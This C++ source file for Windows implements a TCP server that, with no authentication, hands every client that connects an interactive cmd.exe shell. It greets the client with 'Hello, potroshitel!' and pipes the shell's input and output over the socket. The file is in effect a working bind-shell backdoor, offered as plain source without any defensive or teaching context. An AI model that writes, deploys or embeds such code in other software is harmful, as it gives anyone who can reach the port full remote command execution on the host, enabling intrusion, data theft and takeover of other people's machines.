#include <thread>
#include "server.h"
#include "error.h"

Server::Server()
{
	GetSystemDirectory(system_directory, sysdir_sz);
	lstrcat(system_directory, "\\cmd.exe");

	// Initialize socket library
	if (WSAStartup(0x0202, (WSADATA *)&buff[0]))
	{
		printf("Error WSAStartup %d\n", WSAGetLastError());
		ExitProcess(0);
	}

	// Create socket
	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0))<0)
	{
		// Error!
		printf("Error socket %d\n", WSAGetLastError());
		WSACleanup();
		ExitProcess(0);
	}

	char optval = 1;
	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval) == SOCKET_ERROR)
	{
		printf("Error setsockopt %d\n", WSAGetLastError());
		WSACleanup();
		ExitProcess(0);
	}

	// Bind socket with local address
	sockaddr_in local_addr;
	local_addr.sin_family = AF_INET;
	local_addr.sin_port = htons(port);
	local_addr.sin_addr.s_addr = 0;

	// Binding
	if (bind(server_sock, (sockaddr *)&local_addr, sizeof(local_addr)))
	{
		// Error
		printf("Error bind %d\n", WSAGetLastError());
		closesocket(server_sock);
		WSACleanup();
		ExitProcess(0);
	}
}

Server::~Server()
{
	WSACleanup();
}

void Server::run()
{
	if (listen(server_sock, 0x100))
	{
		// error
		printf("Error listen %d\n", WSAGetLastError());
		closesocket(server_sock);
		WSACleanup();
		ExitProcess(0);
	}

	sockaddr_in client_addr;
	int client_addr_size = sizeof(client_addr);

	while ((client_sock = accept(server_sock, (sockaddr *) &client_addr, &client_addr_size)))
	{
		std::thread th(&Server::handle_connection, this, &client_sock);
		th.detach();
	}
}

int /*DWORD*/ Server::handle_connection(LPVOID client_socket)
{
	SOCKET sock;
	sock = ((SOCKET *)client_socket)[0];
	char buff[20];
	#define sHELLO "Hello, potroshitel!\r\n"

	send(sock, sHELLO, sizeof(sHELLO), 0);

	get_console(sock);

	std::wcout << "disconnect" << std::endl;

	return 0;
}

void Server::get_console(SOCKET &sock)
{
	// Create structures needed for work with pipes
	STARTUPINFO si = { 0 };
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	HANDLE new_stdout, new_stdin, read_stdout, write_stdin;

	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = true;

	// Create pipes
	if (!CreatePipe(&new_stdin, &write_stdin, &sa, 0))
	{
		return;
	}
	if (!CreatePipe(&read_stdout, &new_stdout, &sa, 0))
	{
		return;
	}

	// Replace descriptors
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError  = new_stdout;
	si.hStdOutput = new_stdout;
	si.hStdInput  = new_stdin;

	// Create child process
	if (!CreateProcess(system_directory, NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		std::cout << GetLastErrorAsString() << std::endl;
		CloseHandle(new_stdin);
		CloseHandle(new_stdout);
		CloseHandle(read_stdout);
		CloseHandle(write_stdin);
		closesocket(sock);
		return;
	}
	char          std_buff[1024];
	unsigned long exit_code = 0; // Exit code
	unsigned long in_std;	// Amount of bytes read from stdout
	unsigned long avail;	// Amount of available bytes
	bool first_command = true;
	// Until process is finished, read/write from pipe to socket and vice versa
	while (GetExitCodeProcess(pi.hProcess, &exit_code) && (exit_code == STILL_ACTIVE))
	{
		PeekNamedPipe(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, &avail, NULL);
		ZeroMemory(std_buff, sizeof(std_buff));
		if (in_std != 0)
		{
			if (avail > (sizeof(std_buff) - 1))
			{
				while (in_std >= (sizeof(std_buff) - 1))
				{
					ReadFile(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, NULL); // Read from pipe
					send(sock, std_buff, strlen(std_buff), 0);
					ZeroMemory(std_buff, sizeof(std_buff));
				}
			}
			else
			{
				ReadFile(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, NULL);
				send(sock, std_buff, strlen(std_buff), 0);
				ZeroMemory(std_buff, sizeof(std_buff));
			}
		}
		unsigned long io_sock;
		// Check socket state, read from it and write to pipe
		if (!ioctlsocket(sock, FIONREAD, &io_sock) && io_sock)
		{
			ZeroMemory(std_buff, sizeof(std_buff));
			recv(sock, std_buff, 1, 0);
			if (first_command == false)
			{
				send(sock, std_buff, strlen(std_buff), 0); // For normal output to telnet
			}
			if (*std_buff == '\x0A')
			{
				WriteFile(write_stdin, "\x0D", 1, &io_sock, 0);
				first_command = false;
			}
			WriteFile(write_stdin, std_buff, 1, &io_sock, 0);
		}
		Sleep(1);
	}
}